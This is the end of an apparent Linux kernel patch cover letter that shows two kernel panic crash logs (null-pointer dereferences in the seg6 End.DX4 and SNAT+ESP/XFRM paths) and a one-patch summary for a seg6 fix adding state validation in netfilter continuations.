[  678.573285][    C0]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  678.574706][    C0]  ? process_backlog+0x330/0x1540
[  678.575956][    C0]  ? process_backlog+0x330/0x1540
[  678.577181][    C0]  __netif_receive_skb+0x1d/0x160
[  678.578437][    C0]  process_backlog+0x382/0x1540
[  678.579674][    C0]  __napi_poll.constprop.0+0xb3/0x540
[  678.580949][    C0]  net_rx_action+0x9b1/0xea0
[  678.582179][    C0]  ? __pfx_net_rx_action+0x10/0x10
[  678.583438][    C0]  ? sched_clock+0x39/0x60
[  678.584641][    C0]  ? sched_clock_cpu+0x6c/0x550
[  678.585874][    C0]  ? __pfx_sched_clock_cpu+0x10/0x10
[  678.587130][    C0]  ? sched_clock_cpu+0x6c/0x550
[  678.588337][    C0]  ? __dev_queue_xmit+0xe73/0x4430
[  678.589603][    C0]  handle_softirqs+0x1d3/0x990
[  678.590903][    C0]  ? __dev_queue_xmit+0xe73/0x4430
[  678.592191][    C0]  do_softirq+0xad/0xe0
[  678.593453][    C0]  </IRQ>
[  678.594423][    C0]  <TASK>
[  678.595487][    C0]  __local_bh_enable_ip+0x109/0x130
[  678.596766][    C0]  ? __dev_queue_xmit+0xe73/0x4430
[  678.597978][    C0]  __dev_queue_xmit+0xe88/0x4430
[  678.599209][    C0]  ? __might_fault+0x138/0x190
[  678.600464][    C0]  ? __pfx___dev_queue_xmit+0x10/0x10
[  678.601718][    C0]  ? __might_fault+0xe0/0x190
[  678.602945][    C0]  ? _copy_from_iter+0x14b/0x1710
[  678.604182][    C0]  ? __pfx__copy_from_iter+0x10/0x10
[  678.605423][    C0]  ? __pfx_ref_tracker_alloc+0x10/0x10
[  678.606737][    C0]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  678.608082][    C0]  ? packet_parse_headers+0x278/0x840
[  678.609410][    C0]  ? __pfx_packet_parse_headers+0x10/0x10
[  678.610797][    C0]  packet_xmit+0x24f/0x370
[  678.611952][    C0]  packet_sendmsg+0x30e3/0x4de0
[  678.613180][    C0]  ? sock_has_perm+0x21f/0x2c0
[  678.614436][    C0]  ? __pfx_sock_has_perm+0x10/0x10
[  678.615706][    C0]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  678.617033][    C0]  ? tomoyo_socket_sendmsg_permission+0x13b/0x3a0
[  678.618424][    C0]  ? __pfx_packet_sendmsg+0x10/0x10
[  678.619672][    C0]  ? selinux_socket_sendmsg+0x18f/0x2e0
[  678.620954][    C0]  ? __pfx_packet_sendmsg+0x10/0x10
[  678.622165][    C0]  __sys_sendto+0x4c3/0x510
[  678.623373][    C0]  ? __pfx___sys_sendto+0x10/0x10
[  678.624633][    C0]  ? sock_ioctl+0x3c8/0x6a0
[  678.625867][    C0]  ? fd_install+0x23d/0x550
[  678.627123][    C0]  ? selinux_file_ioctl+0x189/0x280
[  678.628378][    C0]  ? selinux_file_ioctl+0xbb/0x280
[  678.629658][    C0]  __x64_sys_sendto+0xe0/0x1c0
[  678.630911][    C0]  ? lockdep_hardirqs_on+0x7d/0x110
[  678.632235][    C0]  do_syscall_64+0x128/0x7b0
[  678.633440][    C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  678.634838][    C0] RIP: 0033:0x44fefa
[  678.636837][    C0] Code: ec 01 00 00 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 15 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 7e c3 0f 1f 44 00 00 41 54 48 83 ec 30 44 89
[  678.640295][    C0] RSP: 002b:00007ffca883d078 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[  678.642313][    C0] RAX: ffffffffffffffda RBX: 00007ffca883d358 RCX: 000000000044fefa
[  678.644071][    C0] RDX: 0000000000000056 RSI: 00007ffca883d0e0 RDI: 0000000000000003
[  678.645560][    C0] RBP: 0000000000000003 R08: 00007ffca883d080 R09: 0000000000000014
[  678.647262][    C0] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffca883ef33
[  678.648965][    C0] R13: 00007ffca883ef38 R14: 00000000004c97d0 R15: 0000000000000001
[  678.650520][    C0]  </TASK>
[  678.651540][    C0] Modules linked in:
[  678.654081][    C0] ---[ end trace 0000000000000000 ]---
[  678.656007][    C0] RIP: 0010:input_action_end_dx4_finish+0x7b/0x570
[  678.657556][    C0] Code: 0f 85 91 02 00 00 e8 94 d9 64 f7 49 89 df 48 b8 00 00 00 00 00 fc ff df 49 83 e7 fe 49 8d bf 88 00 00 00 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 81 04 00 00 48 8d bd d0 00 00 00 4d 8b b7 88 00
[  678.661176][    C0] RSP: 0018:ffa0000000007888 EFLAGS: 00000206
[  678.662620][    C0] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000101
[  678.664355][    C0] RDX: 0000000000000011 RSI: ffffffff8a5d531c RDI: 0000000000000088
[  678.666358][    C0] RBP: ff110000301de500 R08: 0000000000000101 R09: ffe21c00064c830c
[  678.668153][    C0] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[  678.669908][    C0] R13: ff110000301de558 R14: 0000000000000000 R15: 0000000000000000
[  678.671680][    C0] FS:  0000000020e713c0(0000) GS:ff110000d566e000(0000) knlGS:0000000000000000
[  678.673288][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  678.674861][    C0] CR2: 000000000049bfe0 CR3: 0000000022296000 CR4: 00000000007516f0
[  678.676600][    C0] PKRU: 55555554
[  678.678037][    C0] Kernel panic - not syncing: Fatal exception in interrupt
[  678.680739][    C0] Kernel Offset: disabled
[  678.682319][    C0] Rebooting in 86400 seconds..
-----END End.DX4 crash log-----

----BEGIN SNAT+ESP/XFRM crash log----
[  413.698202][ T5020] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000008: 0000 [#1] SMP KASAN NOPTI
[  413.700821][ T5020] KASAN: null-ptr-deref in range [0x0000000000000040-0x0000000000000047]
[  413.703018][ T5020] CPU: 0 UID: 0 PID: 5020 Comm: ping Not tainted 7.3.0-rc7-00196-gf4377bf85887 #2 PREEMPT(full) 
[  413.704907][ T5020] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  413.706751][ T5020] RIP: 0010:dst_cache_get+0x25/0x5d0
[  413.709224][ T5020] Code: 90 90 90 90 90 f3 0f 1e fa 41 56 41 55 41 54 55 48 89 fd 53 e8 ac cc 39 f8 48 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <80> 3c 02 00 0f 85 b9 04 00 00 4c 8b 65 00 4d 85 e4 0f 84 a1 02 00
[  413.712193][ T5020] RSP: 0018:ffa00000019b7810 EFLAGS: 00000202
[  413.713522][ T5020] RAX: dffffc0000000000 RBX: ff11000030182a80 RCX: 0000000000000400
[  413.715033][ T5020] RDX: 0000000000000008 RSI: ffffffff89886004 RDI: 0000000000000040
[  413.716524][ T5020] RBP: 0000000000000040 R08: 0000000000000200 R09: 0000000000000001
[  413.718070][ T5020] R10: 0000000000000000 R11: 0000000000000001 R12: ff1100001cf9d8c0
[  413.719549][ T5020] R13: 0000000000000000 R14: ffffffff8a5c773c R15: ff1100001cf9d918
[  413.721087][ T5020] FS:  00007f2b4a18a000(0000) GS:ff110000d566e000(0000) knlGS:0000000000000000
[  413.722956][ T5020] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  413.724291][ T5020] CR2: 00007ffd11863680 CR3: 000000002faaf000 CR4: 00000000007516f0
[  413.725843][ T5020] PKRU: 55555554
[  413.726865][ T5020] Call Trace:
[  413.728028][ T5020]  <TASK>
[  413.729220][ T5020]  ? seg6_output_core+0x10c/0x10d0
[  413.730609][ T5020]  seg6_output_core+0x131/0x10d0
[  413.731932][ T5020]  ? __pfx_seg6_output_core+0x10/0x10
[  413.733237][ T5020]  ? __pfx_seg6_output_core+0x10/0x10
[  413.734500][ T5020]  ? __pfx_nf_hook.constprop.0+0x10/0x10
[  413.735796][ T5020]  ? __pfx_dst_output+0x10/0x10
[  413.737114][ T5020]  ? __pfx_seg6_output_core+0x10/0x10
[  413.738389][ T5020]  ? lock_acquire+0x1bf/0x370
[  413.739618][ T5020]  seg6_output+0x31/0x250
[  413.740807][ T5020]  lwtunnel_output+0x311/0x760
[  413.742080][ T5020]  ? __pfx_lwtunnel_output+0x10/0x10
[  413.743334][ T5020]  ip_push_pending_frames+0x2d0/0x320
[  413.744601][ T5020]  raw_sendmsg+0x1481/0x33c0
[  413.745822][ T5020]  ? tomoyo_check_acl+0x3a0/0x410
[  413.747117][ T5020]  ? __pfx_raw_sendmsg+0x10/0x10
[  413.748386][ T5020]  ? tomoyo_check_inet_address+0x43d/0x6b0
[  413.749740][ T5020]  ? tomoyo_check_inet_address+0xe4/0x6b0
[  413.751103][ T5020]  ? tomoyo_socket_sendmsg_permission+0x13b/0x3a0
[  413.752546][ T5020]  ? __pfx_raw_sendmsg+0x10/0x10
[  413.753772][ T5020]  ? __pfx_inet_sendmsg+0x10/0x10
[  413.755003][ T5020]  inet_sendmsg+0x121/0x150
[  413.756183][ T5020]  __sys_sendto+0x46f/0x510
[  413.757398][ T5020]  ? __pfx___sys_sendto+0x10/0x10
[  413.758667][ T5020]  ? exc_page_fault+0xbe/0x170
[  413.759966][ T5020]  __x64_sys_sendto+0xe0/0x1c0
[  413.761193][ T5020]  ? lockdep_hardirqs_on+0x7d/0x110
[  413.762508][ T5020]  do_syscall_64+0x128/0x7b0
[  413.763678][ T5020]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  413.765067][ T5020] RIP: 0033:0x7f2b4a40a046
[  413.766762][ T5020] Code: 0e 0d 00 f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 11 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 72 c3 90 55 48 83 ec 30 44 89 4c 24 2c 4c 89
[  413.770366][ T5020] RSP: 002b:00007ffd118641a8 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[  413.772397][ T5020] RAX: ffffffffffffffda RBX: 00007ffd11865930 RCX: 00007f2b4a40a046
[  413.773823][ T5020] RDX: 0000000000000040 RSI: 000055d0a1373300 RDI: 0000000000000003
[  413.775217][ T5020] RBP: 000055d0a1373300 R08: 00007ffd11867bac R09: 0000000000000010
[  413.776618][ T5020] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000040
[  413.778021][ T5020] R13: 00007ffd118658f0 R14: 00007ffd118641b0 R15: 0000001d00000001
[  413.779501][ T5020]  </TASK>
[  413.780471][ T5020] Modules linked in:
[  413.782976][ T5020] ---[ end trace 0000000000000000 ]---
[  413.784581][ T5020] RIP: 0010:dst_cache_get+0x25/0x5d0
[  413.786189][ T5020] Code: 90 90 90 90 90 f3 0f 1e fa 41 56 41 55 41 54 55 48 89 fd 53 e8 ac cc 39 f8 48 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <80> 3c 02 00 0f 85 b9 04 00 00 4c 8b 65 00 4d 85 e4 0f 84 a1 02 00
[  413.789339][ T5020] RSP: 0018:ffa00000019b7810 EFLAGS: 00000202
[  413.790719][ T5020] RAX: dffffc0000000000 RBX: ff11000030182a80 RCX: 0000000000000400
[  413.792152][ T5020] RDX: 0000000000000008 RSI: ffffffff89886004 RDI: 0000000000000040
[  413.793582][ T5020] RBP: 0000000000000040 R08: 0000000000000200 R09: 0000000000000001
[  413.795334][ T5020] R10: 0000000000000000 R11: 0000000000000001 R12: ff1100001cf9d8c0
[  413.796920][ T5020] R13: 0000000000000000 R14: ffffffff8a5c773c R15: ff1100001cf9d918
[  413.798424][ T5020] FS:  00007f2b4a18a000(0000) GS:ff110000d566e000(0000) knlGS:0000000000000000
[  413.800256][ T5020] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  413.801562][ T5020] CR2: 00007ffd11863680 CR3: 000000002faaf000 CR4: 00000000007516f0
[  413.803003][ T5020] PKRU: 55555554
[  413.804432][ T5020] Kernel panic - not syncing: Fatal exception in interrupt
[  413.807132][ T5020] Kernel Offset: disabled
[  413.808629][ T5020] Rebooting in 86400 seconds..
-----END SNAT+ESP/XFRM crash log-----

Best regards,
Zixuan Chai

Zixuan Chai (1):
  seg6: validate state in netfilter continuations

 net/ipv6/seg6_iptunnel.c | 62 +++++++++++++++++++++++++++++++---------
 net/ipv6/seg6_local.c    | 55 +++++++++++++++++++++++++++++++++--
 2 files changed, 101 insertions(+), 16 deletions(-)

-- 
2.34.1

